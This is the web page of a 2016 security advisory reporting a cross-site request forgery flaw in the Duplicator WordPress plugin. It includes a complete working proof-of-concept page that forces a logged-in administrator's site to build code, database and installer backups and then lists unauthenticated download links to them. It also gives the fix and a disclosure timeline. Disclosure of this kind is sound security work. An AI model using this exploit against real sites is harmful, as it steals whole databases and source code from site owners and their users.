<!DOCTYPE html> <html> <head> <meta charset="utf-8"> <meta name="apple-mobile-web-app-capable" content="yes"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <meta name="viewport" content="width=device-width, initial-scale=1"> <title> Duplicator Wordpress Plugin Code and Database Dump via CSRF vulnerability | RatioSec </title> <meta name="description" content=" Information Security "> <meta name="keywords" content="RatioSec, security, cyber security, application security, network security, penetration testing"> <meta name="HandheldFriendly" content="True"> <meta name="MobileOptimized" content="320"> <!-- Social: Facebook / Open Graph --> <meta property="og:type" content="article"> <meta property="article:author" content="RatioSec"> <meta property="article:section" content="research"> <meta property="article:tag" content=""> <meta property="article:published_time" content="2016-02-09 21:54:52 +0000"> <meta property="og:url" content="http://www.ratiosec.com/2016/duplicator-wordpress-plugin-source-database-disclosure-via-csrf/"> <meta property="og:title" content=" Duplicator Wordpress Plugin Code and Database Dump via CSRF vulnerability | RatioSec "> <meta property="og:image" content="http://www.ratiosec.com"> <meta property="og:description" content=" Information Security "> <meta property="og:site_name" content="RatioSec"> <meta property="og:locale" content="en_US"> <!-- Social: Twitter --> <meta name="twitter:card" content="summary_large_image"> <meta name="twitter:site" content="@ratio_sec"> <meta name="twitter:title" content=" Duplicator Wordpress Plugin Code and Database Dump via CSRF vulnerability | RatioSec "> <meta name="twitter:description" content=" Information Security "> <meta name="twitter:image:src" content="http://www.ratiosec.com"> <!-- Social: Google+ / Schema.org --> <meta itemprop="name" content=" Duplicator Wordpress Plugin Code and Database Dump via CSRF vulnerability | RatioSec "> <meta itemprop="description" content=" Information Security "> <meta itemprop="image" content="http://www.ratiosec.com"> <!-- rel prev and next --> <link rel="stylesheet" href="/assets/css/main.css"> <!-- Canonical link tag --> <link rel="canonical" href="http://www.ratiosec.com/2016/duplicator-wordpress-plugin-source-database-disclosure-via-csrf/"> <link rel="alternate" type="application/rss+xml" title="RatioSec" href="http://www.ratiosec.com/feed.xml"> <link rel="shortcut icon" href="/assets/images/favicon.png"> <script type="text/javascript"> var disqus_shortname = 'ratiosec'; var _gaq = _gaq || []; _gaq.push(['_setAccount', '']); _gaq.push(['_trackPageview']); (function() { var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true; ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js'; var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s); })(); </script> </head> <body> <main class="wrapper"> <header class="site-header"> <nav class="nav"> <div class="container"> <h1 class="logo"><a href="/"><img src="/assets/images/logo.png"></a></h1> <ul class="navbar"> <li><a href="/services">Services</a></li> <li><a href="/research">Research</a></li> <li><a href="/contact">Contact</a></li> </ul> </div> </nav> </header> <article class="post container" itemscope itemtype="http://schema.org/BlogPosting"> <header class="post-header"> <h1 class="post-title" itemprop="name headline">Duplicator Wordpress Plugin Code and Database Dump via CSRF vulnerability</h1> <p class="post-meta"><time datetime="2016-02-09T21:54:52+00:00" itemprop="datePublished">Feb 9, 2016</time></p> </header> <div class="post-content" itemprop="articleBody"> <table> <tbody> <tr> <td>Advisory ID</td> <td>RS-2016-002</td> </tr> <tr> <td>Product</td> <td>Duplicator WordPress Plugin</td> </tr> <tr> <td>Vendor</td> <td>Life In The Grid</td> </tr> <tr> <td>Tested Versions</td> <td>1.1.0, 1.2.0</td> </tr> <tr> <td>Other Vulnerable Versions</td> <td>Prior versions may also be affected</td> </tr> <tr> <td>Vendor Notification</td> <td>29th January, 2016</td> </tr> <tr> <td>Advisory Publication</td> <td>9th February, 2016</td> </tr> <tr> <td>CVE Reference</td> <td>Pending</td> </tr> <tr> <td>Risk Level</td> <td>High</td> </tr> <tr> <td>CVSSv3 Base Score</td> <td>AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N</td> </tr> </tbody> </table> <h1 id="advisory">Advisory</h1> <p>RatioSec Research has discovered a cross-site request forgery vulnerability in Duplicator WordPress Plugin which can be exploited to generate and disclose the WordPress database and code backups.</p> <p>The application allows users to perform certain actions via HTTP requests without performing proper checks to verify the requests validity. An authenticated userâ€™s browser can be forced to generate and disclose the WordPress database and code backups via the vulnerable backup function by tricking the user into visiting a malicious web site.</p> <h1 id="proof-of-concept">Proof Of Concept</h1> <p>The proof of concept HTML page, if visited by a logged-in administrative user, raises two requests (<code>/wp-admin/admin.php?page=duplicator&amp;tab=new2</code> and <code>/wp-admin/admin-ajax.php?action=duplicator_package_build</code>) forcing the creation of the WordPress source code, database, and install scripts backup in the paths <code>/wp-snapshots/ratiosec_ratiosec_archive.zip</code>, <code>/wp-snapshots/ratiosec_ratiosec_database.sql</code>, and <code>/wp-snapshots/ratiosec_ratiosec_installer.php</code>. Once generated, the backup archives can be downloaded by the attacker with no authentication.</p> <p><img src="/assets/images/posts/0003-001.png" alt="PoC Screenshot" /></p> <figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;html&gt;</span>
  <span class="nt">&lt;body&gt;</span>
    <span class="nt">&lt;script&gt;</span>

      <span class="nx">wordpress_root</span> <span class="o">=</span> <span class="s2">&quot;http://localhost/wordpress&quot;</span><span class="p">;</span>

      <span class="kd">function</span> <span class="nx">submitRequest1</span><span class="p">()</span>
      <span class="p">{</span>
        <span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
        <span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s2">&quot;POST&quot;</span><span class="p">,</span> <span class="nx">wordpress_root</span> <span class="o">+</span> <span class="s2">&quot;/wp-admin/admin.php?page=duplicator&amp;tab=new2&quot;</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
        <span class="nx">xhr</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="s2">&quot;Accept&quot;</span><span class="p">,</span> <span class="s2">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;</span><span class="p">);</span>
        <span class="nx">xhr</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="s2">&quot;Accept-Language&quot;</span><span class="p">,</span> <span class="s2">&quot;en-GB,en;q=0.5&quot;</span><span class="p">);</span>
        <span class="nx">xhr</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="s2">&quot;Content-Type&quot;</span><span class="p">,</span> <span class="s2">&quot;application/x-www-form-urlencoded&quot;</span><span class="p">);</span>
        <span class="nx">xhr</span><span class="p">.</span><span class="nx">withCredentials</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
        <span class="kd">var</span> <span class="nx">body</span> <span class="o">=</span> <span class="s2">&quot;action=&amp;package-hash=ratiosec&amp;package-name=ratiosec&amp;package-notes=&amp;archive-format=ZIP&amp;filter-dirs=&amp;filter-exts=&amp;dbhost=&amp;dbport=&amp;dbname=&amp;dbuser=&amp;url-new=&quot;</span><span class="p">;</span>
        <span class="kd">var</span> <span class="nx">aBody</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Uint8Array</span><span class="p">(</span><span class="nx">body</span><span class="p">.</span><span class="nx">length</span><span class="p">);</span>
        <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">aBody</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span>
          <span class="nx">aBody</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">=</span> <span class="nx">body</span><span class="p">.</span><span class="nx">charCodeAt</span><span class="p">(</span><span class="nx">i</span><span class="p">);</span>
        <span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="k">new</span> <span class="nx">Blob</span><span class="p">([</span><span class="nx">aBody</span><span class="p">]));</span>
      <span class="p">}</span>
      <span class="kd">function</span> <span class="nx">submitRequest2</span><span class="p">()</span>
      <span class="p">{</span>
        <span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
        <span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s2">&quot;GET&quot;</span><span class="p">,</span> <span class="nx">wordpress_root</span> <span class="o">+</span> <span class="s2">&quot;/wp-admin/admin-ajax.php?action=duplicator_package_build&quot;</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
        <span class="nx">xhr</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="s2">&quot;Accept&quot;</span><span class="p">,</span> <span class="s2">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;</span><span class="p">);</span>
        <span class="nx">xhr</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="s2">&quot;Accept-Language&quot;</span><span class="p">,</span> <span class="s2">&quot;en-GB,en;q=0.5&quot;</span><span class="p">);</span>
        <span class="nx">xhr</span><span class="p">.</span><span class="nx">withCredentials</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
        <span class="kd">var</span> <span class="nx">body</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
        <span class="kd">var</span> <span class="nx">aBody</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Uint8Array</span><span class="p">(</span><span class="nx">body</span><span class="p">.</span><span class="nx">length</span><span class="p">);</span>
        <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">aBody</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span>
          <span class="nx">aBody</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">=</span> <span class="nx">body</span><span class="p">.</span><span class="nx">charCodeAt</span><span class="p">(</span><span class="nx">i</span><span class="p">);</span>
        <span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="k">new</span> <span class="nx">Blob</span><span class="p">([</span><span class="nx">aBody</span><span class="p">]));</span>
      <span class="p">}</span>
      <span class="kd">function</span> <span class="nx">printLinks</span><span class="p">()</span>
      <span class="p">{</span>

	<span class="kd">var</span> <span class="nx">dumps</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&quot;ratiosec_ratiosec_archive.zip&quot;</span><span class="p">,</span> <span class="s2">&quot;ratiosec_ratiosec_database.sql&quot;</span><span class="p">,</span> <span class="s2">&quot;ratiosec_ratiosec_installer.php&quot;</span><span class="p">];</span>
	<span class="k">for</span><span class="p">(</span><span class="kd">var</span> <span class="nx">a</span> <span class="k">in</span> <span class="nx">dumps</span><span class="p">)</span> <span class="p">{</span>
		<span class="kd">var</span> <span class="nx">url</span> <span class="o">=</span> <span class="nx">wordpress_root</span> <span class="o">+</span> <span class="s1">&#39;/wp-snapshots/&#39;</span> <span class="o">+</span> <span class="nx">dumps</span><span class="p">[</span><span class="nx">a</span><span class="p">];</span>
		<span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">+=</span> <span class="s1">&#39;&lt;br/&gt;&lt;a href=&quot;&#39;</span> <span class="o">+</span> <span class="nx">url</span> <span class="o">+</span>  <span class="s1">&#39;&quot;&gt;&#39;</span> <span class="o">+</span> <span class="nx">url</span> <span class="o">+</span> <span class="s1">&#39;&lt;/a&gt;&#39;</span><span class="p">;</span>
	<span class="p">};</span>
      <span class="p">}</span>
    <span class="nt">&lt;/script&gt;</span>
    <span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">&quot;#&quot;</span><span class="nt">&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;button&quot;</span> <span class="na">value=</span><span class="s">&quot;Submit request&quot;</span> <span class="na">onclick=</span><span class="s">&quot;submitRequest1();setTimeout(submitRequest2,2000);setTimeout(printLinks,2500);&quot;</span> <span class="nt">/&gt;</span>
    <span class="nt">&lt;/form&gt;</span>
    <span class="nt">&lt;p&gt;</span>Submit the CSRF request and wait few seconds to see below the public links of the dumps.<span class="nt">&lt;/p&gt;</span>
  <span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span></code></pre></figure> <h1 id="solution">Solution</h1> <p>Update to version 1.1.4.</p> <h1 id="timeline">Timeline</h1> <ul> <li>First contact: 29th January, 2016</li> <li>Disclosure: 29th January, 2016. Preliminary date set to 19th, February 2016.</li> <li>Postponed: Date pushed back to 19th February, 2016</li> <li>Fixed in GIT: 6th February, 2016</li> <li>Fixed release: 9th February, 2016</li> <li>Advisory Publication: 9th February, 2016</li> </ul> <aside class="share"> <h4>Share this.</h4> <a href="http://twitter.com/share?text=Duplicator Wordpress Plugin Code and Database Dump via CSRF vulnerability&amp;url=http://www.ratiosec.com/2016/duplicator-wordpress-plugin-source-database-disclosure-via-csrf/&amp;hashtags=web,dev,blog,soudev&amp;via=ratio_sec" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">Twitter</a> <a href="https://www.facebook.com/sharer/sharer.php?u=http://www.ratiosec.com/2016/duplicator-wordpress-plugin-source-database-disclosure-via-csrf/" onclick="window.open(this.href, 'facebook-share', 'width=550,height=235');return false;">Facebook</a> </aside> </div> </article> <aside id="comments" class="disqus"> <div class="container"> <h3><i class="icon icon-comments-o"></i> Comments</h3> <div id="disqus_thread"></div> <script type="text/javascript"> var disqus_shortname = 'ratiosec'; var disqus_identifier = '/2016/duplicator-wordpress-plugin-source-database-disclosure-via-csrf'; var disqus_title = 'Duplicator Wordpress Plugin Code and Database Dump via CSRF vulnerability'; var disqus_url = 'http://www.ratiosec.com'; /*var disqus_developer = 1;*/ (function() { var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true; dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js'; (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq); })(); </script> <noscript> Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a> </noscript> </div> </aside> <footer class="site-footer"> <div class="container"> <small class="pull-left">RatioSec 2016. Except where otherwise noted, this website is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by/4.0/">Creative Commons Attribution 4.0 International Licence</a>.</small> </div> </footer> </main> </body> </html>
